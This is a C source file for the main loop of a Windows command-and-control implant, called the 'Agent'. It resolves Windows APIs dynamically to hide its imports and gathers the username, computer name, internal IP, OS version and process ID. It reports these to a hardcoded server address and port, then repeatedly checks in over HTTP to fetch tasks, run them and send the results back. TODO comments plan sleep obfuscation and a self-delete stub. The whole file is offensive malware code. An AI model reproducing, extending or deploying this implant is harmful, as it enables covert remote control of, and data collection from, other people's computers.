//
// Created by j4ck on 3/11/24.
//

/* This is the main init file for the Agent */

#include <windows.h>
#include <wchar.h>
#include <stdio.h>
#include <iptypes.h>
#include <stdlib.h>
#include <wininet.h>

#include "Core/Include/Agent.h"
#include "Core/Include/Win32.h"
#include "Core/Include/Http.h"
#include "Core/Include/Serializer.h"
#include "Core/Include/Commands.h"
#include "Core/Include/Tasks.h"

#define MAX_USERNAME_LENGTH 104
#define MAX_IPV4_LENGTH 16

#pragma comment(lib, 'Iphlpapi.lib');
#pragma comment(lib, 'Gdi32.lib')


AGENT_INSTANCE myAgent = { 0 };
PAGENT_INSTANCE Agent = &myAgent;


// Resolve Win32 Wrapped Functions
BOOL InitWin32() {
    HMODULE iphApi = LoadLibraryW(L"IPHLPAPI.dll"); // This is gnarly. Fuk it.
    if (iphApi == NULL) {
        wprintf(L"[!] LoadLibraryW Failed iphlpapi %d\n", GetLastError());
        return FALSE;
    }
    Agent->Api.GetVersion =                         (fnGetVersion)GetProcAddressC(GetModuleHandleC(L"kernel32.dll"), "GetVersion");
    Agent->Api.GetComputerNameW =                   (fnGetComputerNameW)GetProcAddressC(GetModuleHandleC(L"kernel32.dll"), "GetComputerNameW");
    Agent->Api.GetUserNameW =                       (fnGetUserNameW)GetProcAddressC(GetModuleHandleC(L"Advapi32.dll"), "GetUserNameW");
    Agent->Api.GetProcessId =                       (fnGetProcessId)GetProcAddressC(GetModuleHandleC(L"kernel32.dll"), "GetProcessId");
    Agent->Api.OpenProcess =                        (fnOpenProcess)GetProcAddressC(GetModuleHandleC(L"kernel32.dll"), "OpenProcess");
    Agent->Api.GetCurrentProcess =                  (fnGetCurrentProcess)GetProcAddressC(GetModuleHandleC(L"kernel32.dll"), "GetCurrentProcess");
    Agent->Api.GetProcessImageFileNameW =           (fnGetProcessImageFileNameW ) GetProcAddressC(GetModuleHandleC(L"kernel32.dll"), "K32GetProcessImageFileNameW");
    Agent->Api.GetAdaptersInfo =                    (fnGetAdaptersInfo)GetProcAddressC(GetModuleHandleC(L"IPHLPAPI.dll"), "GetAdaptersInfo");
    Agent->Api.Sleep    =                           (fnSleep)GetProcAddressC(GetModuleHandleC(L"kernel32.dll"), "Sleep");

    return TRUE;

}

/* Gets Agent Information. (Username, Computer Name, Internal IP, Windows Version, PID, Process Name */
BOOL GetAgentInformation(IN OUT AgentInfo *agentInfo) {
    //PWCHAR both = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_COMPUTERNAME_LENGTH + MAX_USERNAME_LENGTH);

    HANDLE hProcess = NULL;

    PIP_ADAPTER_INFO pAdapterInfo;
    PIP_ADAPTER_INFO pAdapter = NULL;
    DWORD dwRetVal = 0;
    ULONG ulOutBufLen = sizeof (IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO *) malloc(sizeof (IP_ADAPTER_INFO));

    /* Get Agent Computer Name */
    Agent->Api.GetComputerNameW(agentInfo->pComputerName, &agentInfo->dwComputerNameSize);
    /* Get Agent Username */
    Agent->Api.GetUserNameW(agentInfo->pUserName, &agentInfo->dwUserNameSize);

    // Get Running Process (agent) Information

    /* Get Process PID */
    agentInfo->PID = Agent->Api.GetProcessId(Agent->Api.GetCurrentProcess());
    hProcess = Agent->Api.OpenProcess(PROCESS_ALL_ACCESS, FALSE, agentInfo->PID);
    if (!hProcess) {
        return FALSE;
    }
    /* Get Windows Version */
    agentInfo->WindowsVersion = Agent->Api.GetVersion();
    /* Get Agent Local IP Address */

    if (pAdapterInfo == NULL) {
        printf("Error allocating memory needed to call GetAdaptersinfo\n");
        return 1;
    }

    if (Agent->Api.GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *) malloc(ulOutBufLen);
        if (pAdapterInfo == NULL) {
            printf("Error allocating memory needed to call GetAdaptersinfo\n");
            return 1;
        }
    }
    if ((dwRetVal = Agent->Api.GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
        pAdapter = pAdapterInfo;
        while (pAdapter) {
            if (agentInfo->pInternalIp != 0)
                break;
            switch (pAdapter->Type) {
                case MIB_IF_TYPE_ETHERNET:
                    agentInfo->pInternalIp = pAdapterInfo->IpAddressList.IpAddress.String;
                    //memcpy(agentInfo->pInternalIp, pAdapterInfo->IpAddressList.IpAddress.String, 16);
                    agentInfo->pInternalIp[16] = '\n';
                    break;
            }

            pAdapter = pAdapter->Next;
        }
    } else {
        printf("[!] GetAdaptersInfo failed with error: %ld\n", dwRetVal);

    }

    // Get Process Image Name
    agentInfo->pProcessName = L"agent.exe"; // TODO change this with CreateSnapShot (find current process) or whatever

    // Cleanup
    if (pAdapterInfo)
        free(pAdapterInfo);

    /*
    if (computerName)
        free(computerName);
    if (userName)
        free(userName);
    */
    return TRUE;
}

void CheckIn(IN OPTIONAL PBYTE pPreviousTaskOutput, IN OPTIONAL PCHAR pPreviousTaskArgs, IN DWORD dwPreviousTaskId) {
    PBYTE pBufferCheckInB64         = NULL;
    PBYTE pBufferTaskOutput         = NULL;
    PCHAR pTaskArgs                 = NULL;
    DWORD dwTaskId                  = 0;

    // [+] 1.) Build Check In
    if (!JsonCreateCheckIn(&pBufferCheckInB64, dwPreviousTaskId, pPreviousTaskArgs, pPreviousTaskOutput)) {
        printf("[!] JsonCreateCheckIn Failed\n");
    }
    // [+] 2.) Get Task from Agent
    if (!HttpGetTask(pBufferCheckInB64, &dwTaskId, &pTaskArgs)) {
        printf("[!] HttpGetTask Failed\n");
    }
    // [+] 3.) Execute Command
    TaskController(dwTaskId, pTaskArgs, &pBufferTaskOutput);
    // [+] 4.) Dispatch Command to Server
    if (pBufferTaskOutput != NULL) {
        CheckIn(pBufferTaskOutput, pTaskArgs, dwTaskId);
    }

    // [+] 5.) Cleanup
    free(pBufferCheckInB64);
    free(pBufferTaskOutput);
    free(pTaskArgs);
}


int main() {
    Agent->Config.url               = L"192.168.152.1";
    Agent->Config.ListenerUri       = "/default-";
    Agent->Config.port              = 8081;
    Agent->Config.sleep             = 5000;

    InitWin32(); // Change this name (resolve something maybe adkfljasdf)

    WCHAR userName[MAX_USERNAME_LENGTH];
    WCHAR computerName[MAX_COMPUTERNAME_LENGTH];
    WCHAR processName[MAX_PATH];
    AgentInfo agentInfo = {
            userName,
            sizeof(userName),
            computerName,
            sizeof(computerName),
            processName,
    };
    if (!GetAgentInformation(&agentInfo)) {
        // Delete stub
    }

    PBYTE pBuffer = NULL;
    JsonCreateInitFromAgentInfo(agentInfo, &pBuffer);
    HttpEstablishConnection(pBuffer);
    free(pBuffer);

    while(TRUE) {
        if (Agent->Config.UniqueId) {
            CheckIn(NULL, NULL, 0);
        }
        // TODO Add Sleep Obfuscation
        Agent->Api.Sleep(3000);
    }
    return 0;

}
